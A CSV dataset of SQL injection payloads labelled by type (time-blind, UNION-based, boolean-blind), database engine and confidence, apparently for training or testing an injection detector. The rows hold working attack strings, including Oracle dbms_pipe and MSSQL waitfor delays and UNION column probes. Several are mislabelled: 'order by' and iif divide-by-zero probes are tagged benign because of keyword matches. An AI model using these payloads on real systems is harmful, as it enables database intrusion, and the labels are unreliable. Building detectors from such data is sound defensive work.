id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
21674,"1%"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ""%"" = """,time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
21723,"1' where 1272 = 1272 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
21744,"1"" ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ""nubc"" like ""nubc",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
21746,"1 ) where 1415 = 1415 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
21656,-1257' ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
21665,"-6546"" ) order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
21687,"1',iif ( 9496 = 4153,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 28 chars.,2
21781,1' ) as njfg where 6392 = 6392 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
21602,"-4828'+ ( select qxnw where 9488 = 9488 union all select 9488,9488--",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
21606,"-3710 ) ) union all select 5770,5770,5770,5770,5770,5770,5770#",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
21607,1' ) where 7537 = 7537 and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
21611,"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
21614,"-7916' ) ) union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",union_based,generic,0.7,UNION-based payload detected. Payload length: 78 chars.,2
21615,1%' and 9198 = 9198--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
21616,"1'|| ( select 'fdkl' where 4572 = 4572 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 101 chars.,2
21621,"1"" ) ) as ubrg where 7318 = 7318 and 7331 = 6529--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
21636,"1' where 2391 = 2391 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,2
21637,"1"" ) as lgxc where 1117 = 1117 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 88 chars.,2
21640,"1' union all select null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
21644,"1%"" ) ) union all select null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 30 chars.,2
21646,-4557%' ) ) or 4537 = 3401 and ( ( '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 42 chars.,2
21651,"1"" ) ) as uxnc where 8041 = 8041 and 9198 = 9198--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
21653,-7442 ) or 3391 = 7492,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
21654,"1%' ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
21658,"-4739' ) ) union all select 6585,6585,6585,6585,6585--",union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
21662,"1"" ) as yphz where 8174 = 8174 union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 84 chars.,2
21664,"1'|| ( select 'ukfj' where 7133 = 7133 union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
21667,"-9032 ) ) union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
21671,"1"" ) as qwyt where 4236 = 4236 union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
21673,"-2643%"" union all select 7779,7779--",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
21680,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
21686,-8625 or 3176 = 2519# fvgl,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
21697,"1"" and 4595 = 4595#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 19 chars.,2
21704,"-6158"" ) ) ) or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 29 chars.,2
